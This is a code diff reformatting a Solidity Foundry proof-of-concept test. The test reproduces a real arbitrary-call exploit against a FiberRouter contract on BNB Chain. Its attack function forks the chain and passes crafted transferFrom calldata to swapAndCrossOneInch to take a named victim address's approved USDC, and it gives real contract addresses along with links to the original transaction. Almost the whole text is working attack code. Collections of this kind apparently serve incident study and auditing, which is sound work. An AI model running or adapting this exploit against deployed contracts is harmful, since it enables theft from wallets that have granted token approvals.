@@ -7,8 +7,8 @@ import "./../interface.sol";
 // TX::https://app.blocksec.com/explorer/tx/bsc/0x7260ad0e4769ae68f0a680356c63140353c18d7be1b86a8c4e99a0fc3b6842c1
 // GUY : https://x.com/MetaSec_xyz/status/1729323254610002277
 // Profit : ~59 USDC
-interface FiberRouter{
-   function swapAndCrossOneInch(
+interface FiberRouter {
+    function swapAndCrossOneInch(
         address swapRouter,
         uint256 amountIn,
         uint256 amountCrossMin, // amountOutMin on uniswap
@@ -27,15 +27,15 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    FiberRouter fiberrouter=FiberRouter(0x4826e896E39DC96A8504588D21e9D44750435e2D);
-    address victim=0x4da35bf35504D77e5C5E9Db6a35B76eB4479306a;
+    FiberRouter fiberrouter = FiberRouter(0x4826e896E39DC96A8504588D21e9D44750435e2D);
+    address victim = 0x4da35bf35504D77e5C5E9Db6a35B76eB4479306a;
     IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
-    address crossToken=0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;
+    address crossToken = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;
 
     event log_Data(bytes data);
 
     function setUp() external {
-        cheats.createSelectFork("bsc", 33874498);
+        cheats.createSelectFork("bsc", 33_874_498);
         deal(address(wbnb), address(this), 1 ether);
     }
 
@@ -47,15 +47,31 @@ contract ContractTest is Test {
 
     function attack() public {
         emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", usdc.balanceOf(address(victim)), 18);
-        uint256 victim_balance=usdc.balanceOf(address(victim));
-        wbnb.approve(address(pancakeRouter),99999 ether);
+        uint256 victim_balance = usdc.balanceOf(address(victim));
+        wbnb.approve(address(pancakeRouter), 99_999 ether);
         address[] memory swapPath = new address[](2);
         swapPath[0] = address(wbnb);
         swapPath[1] = address(usdc);
-        pancakeRouter.swapExactETHForTokens{value: 0.0000001 ether}(1, swapPath, address(fiberrouter), block.timestamp+20);
-        bytes memory datas=abi.encodePacked(abi.encodeWithSignature("transferFrom(address,address,uint256)", address(victim),address(this),victim_balance));
+        pancakeRouter.swapExactETHForTokens{value: 0.0000001 ether}(
+            1, swapPath, address(fiberrouter), block.timestamp + 20
+        );
+        bytes memory datas = abi.encodePacked(
+            abi.encodeWithSignature(
+                "transferFrom(address,address,uint256)", address(victim), address(this), victim_balance
+            )
+        );
         emit log_Data(datas);
-        fiberrouter.swapAndCrossOneInch(address(usdc), 0, 1, 43114, address(crossToken), address(crossToken), 0, datas, address(usdc), address(usdc));
-    
+        fiberrouter.swapAndCrossOneInch(
+            address(usdc),
+            0,
+            1,
+            43_114,
+            address(crossToken),
+            address(crossToken),
+            0,
+            datas,
+            address(usdc),
+            address(usdc)
+        );
     }
 }
